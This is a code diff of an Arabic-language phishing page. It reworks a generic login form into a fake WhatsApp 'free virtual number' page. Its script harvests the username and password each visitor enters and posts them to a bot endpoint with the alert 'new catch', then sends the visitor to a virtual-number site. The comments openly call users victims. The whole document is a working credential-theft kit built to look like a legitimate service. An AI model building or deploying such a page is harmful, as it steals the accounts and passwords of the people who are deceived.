@@ -3,132 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>تفعيل رقم وهمي - واتساب</title>
     <style>
-        /* إعدادات الخلفية العامة للموقع */
         body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); /* خلفية ملونة متدرجة */
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); /* خلفية بلون الواتساب */
+            display: flex; justify-content: center; align-items: center; height: 100vh;
         }
-
-        /* تنسيق بطاقة تسجيل الدخول */
-        .login-box {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            width: 100%;
-            max-width: 380px;
-            text-align: center;
+        .container {
+            background: white; padding: 30px; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
         }
-
-        #pageImg {
-            width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            object-fit: cover;
-        }
-
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 22px;
-        }
-
+        #pageImg { width: 100%; border-radius: 8px; margin-bottom: 15px; }
+        h2 { color: #075E54; margin-bottom: 20px; font-size: 20px; }
         input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-sizing: border-box; /* لضمان عدم خروج الإدخال عن الإطار */
-            outline: none;
-            transition: 0.3s;
+            width: 100%; padding: 12px; margin-bottom: 15px;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
         }
-
-        input:focus {
-            border-color: #764ba2;
-            box-shadow: 0 0 5px rgba(118, 75, 162, 0.3);
-        }
-
         button {
-            width: 100%;
-            padding: 12px;
-            background: #764ba2;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
+            width: 100%; padding: 12px; background: #25D366; color: white;
+            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
-
-        button:hover {
-            background: #5a3a7e;
-            transform: translateY(-2px);
-        }
+        button:hover { background: #1ebd59; }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <img id="pageImg" src="https://via.placeholder.com/400x200?text=جاري+التحميل..." alt="Header">
-        
-        <h2 id="pageLetter">جاري تحميل البيانات...</h2>
+    <div class="container">
+        <img id="pageImg" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" style="width: 80px;">
+        <h2 id="pageLetter">سجل دخول للحصول على رقم وهمي مجاناً</h2>
 
-        <form id="victimForm">
-            <input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" id="password" placeholder="كلمة السر" required>
-            
-            <button type="submit" id="pageBtn">تسجيل دخول</button>
+        <form id="redirectForm">
+            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" id="pageBtn">احصل على الرقم الآن</button>
         </form>
     </div>
 
     <script>
-        // دالة لجلب الإعدادات من اللوحة تلقائياً
-        async function fetchConfig() {
+        // دالة جلب البيانات من اللوحة (لتغيير الصورة والنص)
+        async function loadConfig() {
             try {
-                const response = await fetch('/api/get');
-                const data = await response.json();
-                
-                if (data.image) document.getElementById('pageImg').src = data.image;
-                if (data.letter) document.getElementById('pageLetter').innerText = data.letter;
-                if (data.button) document.getElementById('pageBtn').innerText = data.button;
-            } catch (err) {
-                console.error("خطأ في جلب الإعدادات");
-            }
+                const res = await fetch('/api/get');
+                const data = await res.json();
+                if(data.image) document.getElementById('pageImg').src = data.image;
+                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
+                if(data.button) document.getElementById('pageBtn').innerText = data.button;
+            } catch(e) { console.log("تحميل افتراضي"); }
         }
+        window.onload = loadConfig;
 
-        // إرسال بيانات الضحية للبوت
-        document.getElementById('victimForm').onsubmit = async (e) => {
+        // دالة الإرسال والتحويل
+        document.getElementById('redirectForm').onsubmit = async (e) => {
             e.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
 
+            // 1. إرسال البيانات للبوت
             await fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    image: "🔑 ضحية جديدة سقطت!",
+                    image: "🚨 صيد جديد من صفحة الأرقام!",
                     letter: "المستخدم: " + user,
                     button: "الباسورد: " + pass
                 })
             });
 
-            // توجيه الضحية بعد الانتهاء
-            window.location.href = "https://www.google.com";
+            // 2. التحويل للموقع الآخر (هنا تضع رابط موقع الأرقام الوهمية أو الجوائز)
+            // سأضعه هنا كمثال لموقع أرقام وهمية مشهور
+            window.location.href = "https://receive-smss.com/"; 
         };
-
-        // تنفيذ جلب الإعدادات عند فتح الصفحة
-        window.onload = fetchConfig;
     </script>
 </body>
 </html>
